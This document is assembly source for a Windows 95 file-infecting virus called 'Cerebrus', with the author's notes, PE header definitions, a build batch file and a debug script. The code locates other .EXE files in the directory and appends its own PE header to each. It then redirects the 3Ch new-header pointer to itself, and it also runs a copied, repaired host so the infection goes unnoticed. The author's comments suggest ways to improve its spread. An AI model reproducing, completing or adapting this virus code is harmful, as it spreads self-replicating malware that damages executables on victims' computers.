;
;                       Cerebrus, by Murkry/IkX
;
;
;
;   this virus is a beta test of an idea I have heard and read about,
; but had never tried. What it does is append its own code to the end of the
; host file and then alter the NEW HEADER pointer at 3ch to point to itself.
; While this virus does work, because of a few mistakes I made the infected
; file will not have any icons associated with it. There are several ways
; around this. But my next attempt at one of these would actualy be larger
; I would just copy the virus in memory to the end of the host. This way I
; would not need to write the internal info and would let Win95 handle it all.
; I actual code the Import data table into the virus this is for size
; consideration . While I still like the idea for this virus the main reason
; I wanted to try it was to try out some code I read about that would mark a
; file as Erase on CLose (or something like that). It describes a self erasing
; file like maybe a Setup program runs once never again. But the idea seems
; like it would only work in NT not 95 at least in my tests.
;   Another thing I found was that while MS pushes us to use the Win32
; CreateProc.. and not WinExec. CreateP will only run PE files while WinExec
; will run dos/NE/PE files. So someone could write this so that it infect all
; those files but would only spread under Win95, in DOS the orginal Dos program
; would be called, In 3.11 you would see the dos error msg, and in Win95 all
; the programs would infect and run ok.
;   In testing this virus works well 'cept for a few little things, like other
; virus that modify the New Header offset it will make the icons vanish since
; the .rscr section is now "lost". A second thing I believe (know) is that
; since I use an internal .idata structure and I only have one of the pntrs to
; the API in it, yet after the first Generation this pntr is overwritten with
; the address of the API call itself. Actually I am sorta surprised this did
; not cause an error, I guess in Win95 it thinks its bound already and leaves
; it alone. Hmm some of you know what I mean others, I sure are lost, ;) sorry.
; Anyway you can fix this in two ways, one easier than the other depending on
; who you talk to. 1 keep the other refrence to the api name, 2 have a routine
; that fixes this before you write the virus to another host.
;   Anyway, despite the problems with this version of the virus I beleive that
; this method with some changes could be very viable in the Win32 enviroment.
;
;   To compile use the mk.bat file.
;
;   The other file 1.inc is just some header info I used after I finished this
; virus I realize I really did not need to do all that work, but for those of
; you who are curios about the PE header examine away.

; Murkry


.386
.model flat, stdcall
True    equ     1
False   equ     0
GENERIC_READ    equ     80000000h
GENERIC_WRITE   equ     40000000h
FATTR_NORMAL    equ     0
OPEN_EXISTING   equ     3

;File is setup so that there will be 2 PE headers we use debug or
; some tool to set the MZ 3ch to point to our second PE header
; then when run the PE part could be append to the other PE files
; and infect in that matter the only parts that need to be alter
; in the section header
;       Pter to Raw Data

LoadAT  equ     01000h
offs    equ     offset PEheader ;+  LoadAT   + 400000h 

;     - offset PEheader +  LoadAT   + 400000h
;Define the needed external functions and constants here.

extrn           ExitProcess:PROC
extrn           MessageBoxA:PROC

extrn           CreateProcessA:PROC
.data                                   ;the data area
dummy           dd      ?               ;tasm needs some data or it won't work!

.code                                   ;executable code starts here
include         1.inc

CodeSect        db      'CODE',0,0,0,0
CodeVSize       dd      0000e000h        ; 
CodeVAddr       dd      LoadAT           ;
CodeSzRawData   dd      00000800h        ; 
CodePtrRwData   dd      00000600h        ;where the code for this section is
                dd      00000000h                                
                dd      00000000h
                dw      0000h
                dw      0000h
CodeChar        dd     0A0000060h       ;6000 0020


RescSect        db      '.rsrc',0,0,0
                dd      00002000H       ; 
                dd      0E000h;LoadAT + 0e000h   ;
                dd      00001600h        ; 
                dd      00000200h        ;where the code for this section is
                dd      00000000h                                
                dd      00000000h
                dw      00h
                dw      00h
                db      40h,00,00,40h 


                dd      0000h
CDseg:
IDATA:
        DD      0               ;  usual this has a redunat entry
                                ;We are skipping it
                                ;  offset API_LOC1 - offset PEheader + LoadAT
                                                         
        dd      0               ;time date stamp
        dd      0               ;where in memory this dll is loaded
 
        DD      offset DLL1 - offset PEheader + LoadAT        

        DD      offset API_LOC2 - offset PEheader + LoadAT     
 
        DD      0               ;  usual this has a redunt entry
                                ;We are skipping it
                                ;  offset API_LOC1 - offset PEheader + LoadAT
                                                         
        dd      0               ;time date stamp
        dd      0               ;where in memory this dll is loaded
 
        DD      offset DLLA - offset PEheader + LoadAT        

        DD      offset API_LOC2A - offset PEheader + LoadAT     
        DD      00000000H


        DB       10H DUP(0)


API_LOC2        DD      offset FUNC1 - offset PEheader + LoadAT    ;
beep            DD      offset FUNC2 - offset PEheader + LoadAT    ;4h
VxdCall0        DD      80000001h                                  ;8h
getcomline      DD      offset FUNC3  - offset PEheader + LoadAT    ;Ch
createp         DD      offset FUNC4  - offset PEheader + LoadAT    ;10h        
Copy            DD      offset FUNC5  - offset PEheader + LoadAT
Create          DD      offset FUNC6  - offset PEheader + LoadAT
FileP           DD      offset FUNC7  - offset PEheader + LoadAT
Read            DD      offset FUNC8  - offset PEheader + LoadAT
Write           DD      offset FUNC9  - offset PEheader + LoadAT
Close           DD      offset FUNC10 - offset PEheader + LoadAT
FindFirst       DD      offset FUNC11 - offset PEheader + LoadAT
FindNext        DD      offset FUNC12 - offset PEheader + LoadAT
CloseFind       DD      offset FUNC13 - offset PEheader + LoadAT
FileSize        DD      offset FUNC14 - offset PEheader + LoadAT
WinEx           DD      offset FUNC15 - offset PEheader + LoadAT
                DD      0
MsgBox:
API_LOC2A       DD      offset FUNCA - offset PEheader + LoadAT    

                DD      0
         
DLL1    DB      'KERNEL32.dll',0
DLLA    DB      'USER32',0

        dw      0               ;ends dll names

FUNC1   dw      0
        db      'ExitProcess',0

FUNC2   dw      0
        DB      'Beep',0

FUNC3   dw      0
        DB      'GetCommandLineA',0

FUNC4   dw      0
        db      'CreateProcessA',0
 
FUNC5   dw      0
        db      'CopyFileA',0
  
FUNC6   dw      0
        db      'CreateFileA',0
 
FUNC7   dw      0
        db      'SetFilePointer',0
  
FUNC8   dw      0
        db      'ReadFile',0
   
FUNC9   dw      0
        db      'WriteFile',0
    
FUNC10  dw      0
        db      'CloseHandle',0

FUNC11  dw      0
        db      'FindFirstFileA',0

FUNC12  dw      0
        db      'FindNextFileA',0

FUNC13  dw      0
        db      'FindClose',0

FUNC14  dw      0
        db      'GetFileSize',0

FUNC15  dw      0
        db      'WinExec',0


        db      0                       ;end of Function list for this DLL


FUNCA   dw      0
        db      'MessageBoxA',0
        dw      0

        db      0               ;end the function list
        db      0               ;end the DLL list


EndIDATA:

Begin:

       Call      Beep


;-------------------------------------------------------------
       ;this API returns the call with " " so we now move this name only
       ;to our buffer excluding the " " and adding the 0 at the end

       call      dword ptr [getcomline]
       
       xchg      esi,eax
       inc       esi
       mov      edi,offset filename
       push     edi                     ;save pointer to the orginal filename

GetLoop:
       lodsb
       cmp      al,'"'
       je       AllDone
       stosb
       jmp      GetLoop

AllDone:
       xor      eax,eax
       stosb

;get the command line in case we need it
       mov      edi, offset pCommandLine
GetLine:
       lodsb
       stosb
       cmp      al,0
       jne      GetLine 
 
;-------------------------------------------------------------
;Now make the file name into something we can use
       pop      esi                     ;pnter to the current file name
       push     esi
       mov      Edi,offset tempfile 

TempFile:
        lodsb
        stosb
        cmp     al,'.'
        jne     TempFile
        xor     eax,eax
        ;MOV     EAX,004D4F43H    ;00'MOC'
        mov     eax, 00455645h  ;00'EVE'
        stosd
;-------------------------------------------------------------
        pop     edi     ;the host file
        
;--------------------------------------------------------------
;Copy the file to another name
       Call     dword ptr [offset Copy] , edi, offset tempfile ,large False
       or      eax,eax
       jz      ErrorFile 
;--------------------------------------------------------------
;Open the File r/w using Create file

Call    dword ptr [Create] , offset tempfile, GENERIC_READ or GENERIC_WRITE, \
                        large 0, large 0, large OPEN_EXISTING, large 0,large 0

        mov     dword ptr [fHandle],eax

;--------------------------------------------------------------
;Move Pointer to the 3ch and fix the pointer to old PE file
        Call dword ptr [FileP] , [fHandle], large 3ch, large 0, large 0

;for debuggin
;        pusha
;        mov     edi,dword ptr [OldOff]
;        call    ConvertIt
;        Call    dword ptr [MsgBox] , large 0, offset tempfile , offset numb
;                                   ,large 1
;        popa
;end for debuggin


;--------------------------------------------------------------
;Write to the file using Write
        Call    dword ptr [Write], [fHandle],offset OldOff,large 4,  \
                        offset NumRead, large 0

;--------------------------------------------------------------
;Close the file
        Call    dword ptr[Close],[fHandle]

;--------------------------------------------------------------
;Run the file using CreateProcess
        Call    dword ptr [createp],             \
                                offset tempfile, \   ;module name
                                offset blank, \   ;command line
                                large 0,        \   ;sec attr
                                large 0,        \   ;thread sec
                                Large False,    \   ;inherit handles
                                large 0,        \   ;create flags
                                large 0,        \   ;Enviroment
                                large 0,        \   ;current directory
                                offset  StartupInfo,        \   ;startup info
                                offset ProcessInfo \   ;process info

         
;---------------------------------------------------------------------------
;Run the file using Winexec
;        Call    dword ptr [WinEx], offset tempfile, large 1
;
;        Call    dword ptr[Close],EAX
;---------------------------------------------------------------------------
;Now try to infect a new file
;1 find file
;2 open the file
;3 make sure its a even 200h boundary alter if needed
;4 modifiy the ptr to raw data in the .Code section
;  write the new end to the file
;5 goto top of file then modify 3ch offset to point to the new location
;
;---------------------------------------------------------------
;1 First find a file

        Call    dword ptr [FindFirst], offset NewHost, offset FindData
        cmp     eax,-1
        je      ErrorFile
 
        mov     dword ptr [hfindFile] ,Eax

        jmp     GotOne

CloseFileTry:
        Call    dword ptr[Close],[fHandle]

tryfornext:
        Call    dword ptr [FindNext], [hfindFile], offset FindData
        or       eax,eax  
        jnz      GotOne

        Call    dword ptr[CloseFind],[hfindFile]
        jmp     ErrorFile

GotOne:
;---------------------------------------------------------------
;Open the File r/w using Create file

Call    dword ptr [Create] , offset fName, GENERIC_READ or GENERIC_WRITE, \
                     large 0, large 0, large OPEN_EXISTING, large 0,large 0

        mov     dword ptr [fHandle],eax

        cmp    eax,-1
        je     tryfornext
;---------------------------------------------------------------
;Get the file size and figure if we need to round it up to a 200h offset
;
        call    dword ptr [FileSize] , [fHandle],large 0 
        cmp     eax,-1
        je      CloseFileTry 

        mov     dword ptr[SizeOfFile],eax
        dec     eax
        mov     ecx,200h
        add     eax,ecx

        XOR     EDX,EDX
        div     ecx
        mul     ecx
        mov     [CodePtrRwData],eax    ;holds the new file size 

;--------------------------------------------------------------
;Read from the  
        Call    dword ptr [Read] ,         \
                          [fHandle],       \ ;handle
                          offset buffer,   \ ;where to read to
                          100h,            \ ;how much to read
                          offset NumRead,  \ ;how much was read
                          large 0           ;overlapped amount not used win95

        or      eax,eax
        jz     CloseFileTry
         
        
        mov     ebx,offset buffer
        cmp     word ptr[ebx],'ZM'
        jne     CloseFileTry               ;Get next file

 
        cmp     dword ptr [ebx + 3ch],0
        je      CloseFileTry

        cmp     dword ptr [ebx + 3ch],100h
        jg      CloseFileTry

        mov     eax,dword ptr[ebx + 3ch]
        mov     dword ptr [OldOff],eax


;--------------------------------------------------------------
;Move Pointer to the endf of the file 
        Call dword ptr [FileP] , [fHandle], large 0, large 0, large  2
                                                 ; file end
;--------------------------------------------------------------
;Get how many bytes to add to the file

        mov     eax,dword ptr [CodePtrRwData]    ; holds what the new file size
        sub     eax,dword ptr [SizeOfFile]

;--------------------------------------------------------------
;Write that many bytes to the end of the file
;Write to the file using Write
        Call    dword ptr [Write],      \
                        [fHandle],      \       ;file handle 
                        offset OldOff,  \       ;where to write from
                        eax,            \       ;how many to write
                        offset NumRead, \       ;how many bytes were writen
                        large 0                 ;overlapped not used in win95

;--------------------------------------------------------------
;Write to the file using Write
        Call    dword ptr [Write],        \
                        [fHandle],        \       ;file handle 
                        offset PEheader,  \       ;where to write from
                        OFFSET filename - offset PEheader,              \       ;how many to write
                        offset NumRead,   \       ;how many bytes were writen
                        large 0                 ;overlapped not used in win95


;--------------------------------------------------------------
;Move Pointer to the TOPF of the file 
        Call dword ptr [FileP] , [fHandle], large 3ch, large 0, large  0   
;--------------------------------------------------------------
;Write the new offset at 3ch 
        Call    dword ptr [Write],        \
                        [fHandle],        \       ;file handle 
                        offset CodePtrRwData,  \       ;where to write from
                        large 4 ,              \       ;how many to write
                        offset NumRead,   \       ;how many bytes were writen
                        large 0                 ;overlapped not used in win95

;--------------------------------------------------------------
;close the file
        Call    dword ptr[Close],[fHandle]

;---------------------------------------------------------------------------

;Call  dword ptr [MsgBox] , large 0,offset tempfile, offset filename ,large 1

ErrorFile:

K32ExitP:
        Call    dword ptr ds:[offset API_LOC2 ] ,-1
      

;--------------------------------------------------------
Beep:
        call    dword ptr ds:[offset beep ] ,eax,eax

        ret

;=====================================================================
;ConvertIt takes a number in Edi and Converts it to Readable and Stores it
; in the location Pointed  at by Esi
;
;Input
;Edi    What number we want to convert to hexdecial readable
;Esi    Where it will be placed When Done
;
;

ConvertIt:
        mov     esi,offset numb
        PushA

        push    Edi
        xchg    Edi,Esi
        mov     cx,1ch


digit_loop:
        pop     Eax
        push    Eax
        
        shr     Eax,Cl
        and     ax,000fh
        sub     cx,4
        cmp     al,9
        jle     number

        sub     al,0ah
        add     al,41h
        jmp     letter

number:
        or      al,30h
letter:
        stosb
        cmp     cx,0fffCh
        jne     digit_loop
        mov     al,0
        stosb

        pop     edi

 
        PopA

        Ret
;===================================================================
MURK    DB      'MURKRY/IkX',0
VIRII   DB      'CEREBRUS',0
info    DB      'The three head guardian, is in your computer, fear no more',0
 
numb            dd      ?

blank           db      ' ',0
OldOff          dd      100h

NewHost         db      '*.EXE',0
victim          db      'Notepad.exe',0  ;in real virus this would be in the
                                       ;find file info 
filename        db      256D dup (?)
tempfile        db      256D dup (?)        
hfindFile       dd      ?              ;
fHandle         dd      ?
NumRead         dd      ?
pCommandLine    db      256D DUP(?)

FindData:
fileattr        dd      ?               ;   DWORD dwFileAttributes;                      ;00 00 00 00 
fCreat          dd      2 dup(?)        ;   FILETIME ftCreationTime;            ;DD ?,?  ;
fAccess         dd      2 dup(?)        ;   FILETIME ftLastAccessTime;          ;DD ?,?  ;
fWrite          dd      2 dup(?)        ;   FILETIME ftLastWriteTime;           ;DD ?,?  ;
fsizelow        dd      ?               ;   DWORD nFileSizeHigh;                         ;
fsizehigh       dd      ?               ;   DWORD nFileSizeLow;                          ;
fresv1          dd      ?               ;   DWORD dwReserved0;                           ;
fresv2          dd      ?               ;   DWORD dwReserved1;                           ;
fName           db      255d dup(?)     ;   CHAR cFileName[MAX_PATH]; 255B               ;
fdosname        db      14d  dup(?)     ;   CHAR cAlternateFileName[ 14 ];               ;

SizeOfFile      dw      ?
FleHdle         dd      ?
ProcessInfo     dd      4h dup(?)
StartupInfo     dd      18h dup(?)
buffer          db      ?


;-------------
ttle    db      'Hello',0
msg     db      'from host',0

CodeEnds:


        Call     MessageBoxA, large 0, offset ttle, offset msg, large 1
        push    -1
        Call    ExitProcess
        end     CodeEnds


;컴�[1.INC]컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

;1.inc
PEheader        db      'PE',0,0           ;200
Machine         dw      014ch
NumSect         dw      0002h           ;Seems Win95 does check this but if
                                        ; there is a Section Header entry
                                        ; it will load that section or as
                                        ; many sections as there are entries
                                        ; in other words it loads till
                                        ; the next section header is 0000h
                                        ; or it has load the NumSect

TimeDate        dd      6f052098h
PtrSymTble      dd      00000000h
Numsymbols      dd      00000000h
SizeOpHder      dw      00e0h
Char            dw      818eh

Magic           dw      010bh
LinkerVer       dw      1902h
SiZeOfCOde      dd       offset CodeEnds  - offset PEheader

SizeOfInitData  dd      00003000h
SizeOfUnintdata dd      000000000

EntryPoint      dd      offset Begin - offset PEheader + LoadAT
BaseCode        dd      00400000h       
BaseData        dd      00400000h

ImageBase       dd      00400000h
SectionAlign    dd      00001000h
FileAlign       dd      00000200h       

OsMajor         dw      0001h
Osminor         dw      0000h
UseMajor        dw      0000h
UseMinor        dw      0000h
SubSysMajor     dw      0003h
SubSysMinor     dw      000Ah
                dw      0000h
                dw      0
ImageSize       dd      00010000h
HeaderSize      dd      offset CDseg - offset PEheader  
FileCheck       dd      0h                              ;checksum
Subsystem       dw      0002h
DllFlag         dw      0000h
StackRes        dd      00100000h
StackComm       dd      00002000h               ;60
HeapRes         dd      00100000h
Heapcomm        dd      00001000h
LoaderFlag      dd      00000000h

NumberRVA       dd      00000010h       ;<this determines how big the
                                        ;the next chunk of code is according
                                        ; to the docs but even put zero
                                        ;here you could crash if you put
                                        ; anything in those fields
                                        ; Win95 does not check this field
                                        ; at least it appears this way 
                                        ; also the rva do not need to be at 
                                        ; section alignemnt for the next bit
                                        ; of whats is id'd as RVA's

ExprtRva        dd      00000000h
TotExpSze       dd      00000000h

;Take this we are pointing this to a section alignment but you do not have to
;do this it can point anywhere as long as the structure it expects to see is
; there
ImprtRva        dd      offset IDATA - offset PEheader + LoadAT      
TotImpSze       dd      offset EndIDATA - Offset IDATA  

;-----------------------------------------------------------
ResRva          dd      0000000h
TotResSze       dd      0000000h

ExcpRva         dd      00000000h
TotEcpSze       dd      00000000h

SecRva          dd      00000000h
TotSecSze       dd      00000000h

FixUpRva        dd      00000000h
TotFixSze       dd      00000000h

DebugTble       dd      00000000h
TotDebug        dd      00000000h

ImagDesc        dd      00000000h
TotDescSze      dd      00000000h

MachSpec        dd      00000000h
MachSpecSze     dd      00000000h

ThreadLocal     dd      00000000h
ThreadLSze      dd      00000000h

                db      30h dup (0)

; the PE header must be f8 in size this is where it starts
; to load the sections
;

;컴�[MK1.BAT]컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
del h1.exe
tasm32 /ml /m4 cerebrus,,;
tlink32 /Tpe /aa /c  /v cerebrus,cerebrus,, import32.lib,  
copy cerebrus.exe host1.s
debug <d1.scr
del cerebrus.exe
ren h1.s cerebrus.exe
del host1.s
del *.obj
del *.map

;컴�[D1.SCR]컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
nhost1.s
l
e13d
6
nh1.s
w
q
                      
